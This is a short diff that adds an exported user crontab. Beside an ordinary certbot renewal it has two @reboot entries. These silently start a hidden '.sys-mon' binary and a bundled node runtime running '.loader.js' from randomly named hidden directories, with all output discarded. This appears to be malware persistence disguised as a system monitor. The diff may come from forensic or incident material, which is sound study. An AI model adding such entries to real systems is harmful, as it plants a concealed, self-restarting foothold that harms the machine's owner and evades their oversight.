@@ -1,0 +1,4 @@
+# crontab for user (exported: crontab -l)
+0 0 * * * /usr/bin/certbot renew
+@reboot nohup /home/user/.config/.system-monitor/.sys-mon >/dev/null 2>&1 &
+@reboot sleep 30 && /home/user/.local/share/.r0qsv8h1/.394ly8v9/bin/node /home/user/.local/share/.r0qsv8h1/.loader.js >/dev/null 2>&1 &
